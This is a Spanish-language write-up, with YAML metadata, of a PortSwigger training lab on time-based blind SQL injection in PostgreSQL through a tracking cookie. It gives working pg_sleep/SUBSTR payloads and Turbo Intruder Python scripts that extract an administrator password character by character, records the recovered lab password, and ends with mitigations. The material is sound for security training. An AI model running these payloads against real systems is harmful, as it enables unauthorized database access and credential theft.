---
title: "Inyección SQL ciega con retrasos temporales y recuperación de información"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "inyeccion-sql-ciega-con-retrasos-temporales-y-recuperacion-de-informacion"
author: "Z4k7"
date: "2026-03-27"
year: "2026"
status: "pwned"
tags:
  - "sqli"
  - "web"
  - "blind"
  - "timebased"
  - "postgresql"
  - "practitioner"
techniques:
  - "Blind SQL Injection"
  - "time-based"
  - "pg_sleep"
  - "PostgreSQL"
  - "cookie injection"
  - "SUBSTR"
  - "LENGTH"
  - "reconstrucción dinámica de password"
tools:
  - "BurpSuite"
  - "Turbo Intruder"
  - "Python"
flags_list:
  - label: "usuario"
    value: "administrator"
  - label: "password"
    value: "y1qu9zyl9ua4bn4gjxf4"
summary: "La Blind SQLi time-based explota la cookie TrackingId en PostgreSQL. Sin output visible, sin errores, sin diferencias de comportamiento — el único canal es el tiempo de respuesta. Este lab extiende el anterior: no solo confirma el delay, sino que extrae el password completo del usuario administrator carácter a carácter usando SUBSTR y pg_sleep con Turbo Intruder. Incluye un script optimizado con reconstrucción dinámica del password en tiempo real.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Se identifica la cookie `TrackingId` via BurpSuite:
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20retardos%20de%20tiempo/file-20260314184841648.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La aplicación no muestra errores ni diferencias en el estado HTTP, confirmando que se trata de una inyección SQL ciega."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Antes de lanzar cualquier payload time-based, mide el tiempo de respuesta base de la app — si la app ya tarda 3-4 segundos normalmente, un delay de 5s sería indistinguible. En este lab el tiempo base es ~233ms, lo que hace que un delay de 10s sea inequívoco."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Medición del tiempo de respuesta base:
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperaci%C3%B3n%20de%20informaci%C3%B3n/file-20260314193159490.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Confirmación del vector con `pg_sleep` directo:
      - kind: "code"
        lang: "SQL"
        code: |
          TrackingId=g5bZmnol84zYOK0g'||pg_sleep(10)--;
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperaci%C3%B3n%20de%20informaci%C3%B3n/file-20260314193324337.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validación canal booleano con condición TRUE/FALSE:
      - kind: "bullet"
        text: "TRUE → tiempo de respuesta 10,215s"
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperaci%C3%B3n%20de%20informaci%C3%B3n/file-20260314193502566.jpg"
        caption: "Evidencia técnica"
      - kind: "bullet"
        text: "FALSE → tiempo de respuesta 233ms"
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperaci%C3%B3n%20de%20informaci%C3%B3n/file-20260314193615488.jpg"
        caption: "Evidencia técnica"
      - kind: "bullet"
        text: "Motor: PostgreSQL (|| + pg_sleep)"
      - kind: "bullet"
        text: "Canal: tiempo de respuesta (TRUE = 10s delay, FALSE = respuesta inmediata)"
      - kind: "bullet"
        text: "Tabla objetivo: users con columnas username, password"

  - id: "root"
    num: "03"
    title: "Paso 1 — Confirmar tabla users y usuario administrator"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          TrackingId=g5bZmnol84zYOK0g'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
      - kind: "note"
        text: |
          → Delay de 10s = tabla `users` existe Y usuario `administrator` existe ✓
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperaci%C3%B3n%20de%20informaci%C3%B3n/file-20260314194310938.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Verificación cambiando el username para confirmar que la condición es específica:
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperaci%C3%B3n%20de%20informaci%C3%B3n/file-20260314194434411.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El paso de verificar con un username diferente es clave — confirma que el delay ocurre solo cuando `administrator` existe, no siempre. Sin esta validación cruzada, podrías tener un falso positivo por latencia de red."

  - id: "step4"
    num: "04"
    title: "Paso 2 — Determinar longitud del password"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=g5bZmnol84zYOK0g'||(SELECT CASE WHEN LENGTH(password)>§N§ THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--;
      - kind: "note"
        text: |
          Via Intruder:
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperaci%C3%B3n%20de%20informaci%C3%B3n/file-20260314195129031.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Script Turbo Intruder para longitud:
      - kind: "code"
        lang: "PYTHON"
        code: |
          def queueRequests(target, wordlists):
              engine = RequestEngine(endpoint=target.endpoint,
                                     concurrentConnections=5,
                                     requestsPerConnection=100,
                                     pipeline=False)
          
              for word in open('C:\\Users\\Public\\numbers.txt'):
                  engine.queue(target.req, word.rstrip())
          
          def handleResponse(req, interesting):
              if req.status != 404:
                  table.add(req)
      - kind: "note"
        text: |
          Resultado: password de longitud confirmada
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperaci%C3%B3n%20de%20informaci%C3%B3n/file-20260314200528787.jpg"
        caption: "Evidencia técnica"

  - id: "step5"
    num: "05"
    title: "Paso 3 — Extraer password carácter a carácter"
    content:
      - kind: "note"
        text: |
          Payload base:
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=g5bZmnol84zYOK0g'||(SELECT CASE WHEN SUBSTR(password,§pos§,1)='§char§' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--;
      - kind: "note"
        text: |
          Script básico Turbo Intruder:
      - kind: "code"
        lang: "PYTHON"
        code: |
          def queueRequests(target, wordlists):
              engine = RequestEngine(endpoint=target.endpoint,
                                     concurrentConnections=2,
                                     requestsPerConnection=20,
                                     pipeline=False)
          
              for numero in range(1, 25):
                  with open('C:\\Users\\Public\\abc.txt') as f:
                      for word in f:
                          word = word.rstrip()
                          engine.queue(target.req, [str(numero), word])
          
          def handleResponse(req, interesting):
              if req.status != 404:
                  table.add(req)
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperaci%C3%B3n%20de%20informaci%C3%B3n/file-20260314231457196.jpg"
        caption: "Evidencia técnica"

  - id: "recon_1"
    num: "06"
    title: "Script optimizado — Reconstrucción dinámica del password"
    content:
      - kind: "code"
        lang: "PYTHON"
        code: |
          found = {}
          def queueRequests(target, wordlists):
              engine = RequestEngine(endpoint=target.endpoint,
                                     concurrentConnections=2,
                                     requestsPerConnection=50,
                                     pipeline=False)
          
              for numero in range(1, 25):
                  with open('C:\\Users\\Public\\abc.txt') as f:
                      for word in f:
                          word = word.rstrip()
                          engine.queue(target.req, [str(numero), word])
          
          def handleResponse(req, interesting):
              global found
              if req.time < 10014:
                  numero = str(req.words[0])
                  letra = str(req.words[1])
                  found[numero] = letra
                  palabra = ''.join(found[i] for i in sorted(found.keys(), key=int))
                  req.label = 'ok - ' + palabra
                  table.add(req)
              elif req.status != 404:
                  table.add(req)
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este script optimizado detecta los hits por tiempo de respuesta (`req.time < 10014` = menor que el delay de 10s → la condición fue FALSE → ese NO es el carácter correcto). La lógica invertida: captura los requests que NO tardaron 10s, reconstruye la palabra en tiempo real con `found[numero] = letra`. Es elegante porque muestra el password parcial construyéndose en la columna `req.label` mientras el ataque corre."
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20retrasos%20temporales%20y%20recuperaci%C3%B3n%20de%20informaci%C3%B3n/file-20260314235044197.jpg"
        caption: "Evidencia técnica"

  - id: "exploit"
    num: "07"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Password completo extraído via Time-based Blind SQLi PostgreSQL. Login exitoso como administrator.

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "usuario"
        value: "administrator"
      - label: "password"
        value: "y1qu9zyl9ua4bn4gjxf4"

  - id: "privesc_1"
    num: "08"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          No aplica — el acceso obtenido ya es el de administrador.

lessons:
  - 'Una aplicación aparentemente segura puede ser explotada mediante tiempo de respuesta.'
  - 'En auditorías, siempre probar inyecciones ciegas cuando no hay mensajes de error visibles.'
  - 'La automatización con Turbo Intruder es clave para escenarios de extracción lenta.'
  - 'SQLi ciega se divide en: Boolean-based, Time-based, Error-based.'
  - 'El script de reconstrucción dinámica permite ver el password construyéndose en tiempo real.'
mitigation:
  - 'Implementar consultas parametrizadas (Prepared Statements).'
  - 'Validar y sanitizar cookies antes de usarlas en SQL.'
  - 'Configurar WAF para detectar patrones de `pg_sleep`.'
  - 'Monitorear tiempos de respuesta anómalos en logs.'
  - 'Aplicar principio de mínimo privilegio en cuentas de BD.'
---
